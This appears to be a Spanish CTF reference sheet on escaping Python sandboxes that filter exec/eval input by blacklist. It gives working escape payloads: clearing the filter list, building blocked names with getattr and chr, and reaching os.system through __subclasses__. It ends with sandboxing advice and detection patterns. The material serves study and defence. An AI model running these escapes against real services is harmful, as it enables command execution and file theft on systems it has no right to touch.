---
title: PyJail: listas negras y escapes
tags: [misc, pyjail, python, sandbox, exec, ctf]
---

# PyJail: listas negras y escapes

[🇬🇧 English](pyjail-bypass.en.md) | **Español**

## 1. Cuándo mirar aquí

Un servicio Python ejecuta entrada del usuario con `exec`/`eval` y filtra palabras. El objetivo es leer un fichero o llamar a una función que el filtro bloquea por su nombre. El patrón clásico:

```python
if any(b in command for b in blacklist):
    continue
exec(command)
```

Antes de improvisar, identificar **qué** se filtra: cadenas, caracteres, longitud, acceso a `__builtins__`. Y comprobar si el proceso muere con la primera excepción, porque eso descarta la extracción booleana.

## 2. Vaciar el filtro

La lista negra suele ser una variable global accesible desde `exec`. Si no se filtran los métodos, se vacía sin corchetes ni comillas:

```python
blacklist.clear()
open_chest()
```

Variantes: `blacklist.__init__()`, `blacklist.pop()` repetido, o reasignar con `globals().update(...)`. Si `clear` está bloqueado, construir el nombre por partes.

## 3. Construir nombres prohibidos

Con `getattr` y concatenación se evita la subcadena literal (si `__builtins__` es el módulo, no un diccionario):

```python
getattr(__builtins__, "op" + "en")("flag.txt").read()
```

Con `chr` se construyen cadenas sin comillas ni letras prohibidas:

```python
print(open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())
```

Si `print` está bloqueado, usar `sys.stdout.write` o `eval(compile(...))`; `exec` siempre devuelve `None`.

## 4. Llegar a los builtins

Cuando el entorno no expone `__builtins__` directamente, se sube por los atributos de un objeto:

```python
().__class__.__base__.__subclasses__()
```

Desde ahí se busca una clase que importe módulos (`warnings.catch_warnings`, `os._wrap_close`) y se llega a `os`:

```python
builtins = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__
imp = builtins.get("__import__")
imp("os").system("id")
```

Los índices cambian entre versiones de Python: hay que listarlos en local antes de fijar uno.

## 5. Cuando el filtro es de caracteres

- Sin comillas: `chr()`, `bytes([...]).decode()`.
- Sin corchetes: `().__class__`, `dict()`, `list()`.
- Sin guiones bajos: `getattr(obj, "_"*2 + "class" + "_"*2)`.
- Sin puntos: `getattr` encadenado.
- Sin `import`: `__import__`, `importlib`, o la clase que ya importó el módulo.

## 6. Límites reales del sandbox

`exec` en el mismo proceso **no es un sandbox**: el atacante comparte `globals()`, puede modificar el filtro y alcanzar el sistema de ficheros. Aislar de verdad exige:

- proceso separado sin privilegios, con `seccomp` y sin ficheros sensibles;
- contenedor de solo lectura y sin red;
- listas blancas de operaciones, no listas negras de cadenas.

## 7. Errores típicos

- **Una excepción cierra el servicio**: probar siempre en local y validar la sintaxis.
- **Índice de subclases distinto**: depende de la versión y de los módulos importados.
- **Filtro por subcadena**: `open` bloquea `open_chest`, pero también `reopen`; construir el nombre evita ambos.
- **`print` bloqueado**: usar `sys.stdout.write` o devolver el valor.
- **Comillas filtradas**: `chr()` es la vía corta, pero algunos filtros bloquean `chr`; entonces `bytes([...])`.

## 8. Detección y mitigación (lado real)

- No ejecutar entrada del usuario: no hay lista negra fiable.
- Si hace falta evaluación, usar un intérprete de expresiones con lista blanca (por ejemplo `ast.literal_eval` para datos) y un proceso aislado.
- Detección: órdenes con `clear()`, `__builtins__`, `__subclasses__`, `getattr`, `chr(` o concatenaciones de nombres; picos de excepciones seguidas de desconexión.

MITRE: T1059 (ejecución de comandos), T1027 (ofuscación). Referencias: documentación de `exec`, `ast.literal_eval` y las guías de escapes de PyJail.
